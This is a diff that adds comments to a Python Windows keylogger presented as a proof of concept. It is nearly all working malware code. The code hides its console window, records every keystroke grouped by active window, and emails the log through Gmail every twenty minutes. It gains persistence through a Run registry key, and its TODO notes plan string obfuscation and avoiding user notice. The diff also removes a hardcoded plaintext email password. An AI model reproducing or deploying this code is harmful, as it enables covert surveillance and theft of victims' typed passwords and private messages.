@@ -9,23 +9,54 @@ from email import encoders
 import win32console,win32gui
 import threading
 
+"""
+File: pylogger.pyw
+
+Description: A Proof of Concept python keylogger. Captures keystrokes and sends the log file 
+to an email address every <n> minutes.
+
+Features:
+    - Keylogging 
+    - Sending Log file through email 
+        - TODO: POST request to a web server, attach log file 
+    
+    - Persistence: Usage of registry 
+"""
+
+
+# Hardcoded debug log file
 logFile = "C:\\Users\\Public\\Music\\log2.txt"
 
 linebuf = ""
 windowName = ""
 
+"""
+    Function Name: hide()
+    Description: Hides the console screen.
+    
+    TODO: After reboot, the console comes up and disappears within 0.5 secondss. 
+    This might alert the user.
+"""
 def hide():
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window,0)
     return True
 
+"""
+    Function Name: loot()
+    Description: Sends the file which contains keylog to an email account.
+        This function will be executed as a thread, every 10 minutes.
+    
+    TODO: obfuscate hardcode string 
+"""
 def loot():
     while True:
         mail = smtplib.SMTP('smtp.gmail.com', 587)
         msg = MIMEMultipart()
-        address = 'wkwkdausfpemqnf@gmail.com'
-        password = 'Wkwkdaus!2213'
+        address = '<EMAIL_ADDRESS>'
+        password = '<EMAIL_PASSWORD>'
 
+        # TODO: Add time for subject?
         msg['Subject'] = 'Log '
         msg['From'] = address
         msg['To'] = address
@@ -44,38 +75,56 @@ def loot():
         server.sendmail(address, address, msg.as_string())
         server.quit()
 
-        time.sleep(600)
+        # Thread repeats every 20 minute
+        time.sleep(1200)
 
+# Write a string line to the log file
 def writeToFile(line):
     fd = open(logFile,'a')
     fd.write(line)
     fd.close()
 
+# [DEBUG] Added for debugging purpose. Creates a log file.
 def init():
     fd = open(logFile, 'a')
     fd.write("Pykeylogger have started.\n")
     fd.close()
 
+
+"""
+    Event Name: OnKeyboardEvent
+    Description: Captures keystroke event, and builds a line buffer. 
+        When an "Enter" or "Tab" is typed, write the line buffer into the log file.
+    
+    Arguments: None
+    Return: None
+
+    TODO: obfuscate hardcode string 
+"""
 def OnKeyboardEvent(event):
     global linebuf
     global windowName
 
+    # If user's window changed, record line buffer
     if windowName != event.WindowName:
         if linebuf != "":
             linebuf += '\n'
             writeToFile(linebuf)
 
+        # Clean linebuf, indicate a new window that the user is using
         linebuf = ""
         newStart = "\nProgram: " + str(event.WindowName.encode('UTF-8')) + "\n"
         writeToFile(newStart)
         windowName = event.WindowName
 
+    # If keystroke of "Enter" (13) or "Tab" (9), record line buffer
     if event.Ascii == 13 or event.Ascii == 9:
         linebuf += '\n'
         writeToFile(linebuf)
         linebuf = ""
         return True
 
+    # If keystroke is "Backspace", remove last char of the line buffer
     elif event.Ascii == 8:
         linebuf = linebuf[:-1]
         return True
@@ -87,9 +136,11 @@ def OnKeyboardEvent(event):
 
 
 def main():
+    # Hide console + Create keylog file
     hide()
     init()
 
+    # Persistence
     filepath = 'C:\\Users\\Public\\Music\\pylogger.exe'
     subprocess.call(r'reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "pylogger" /t REG_SZ /f /d "%s"' % filepath)
 
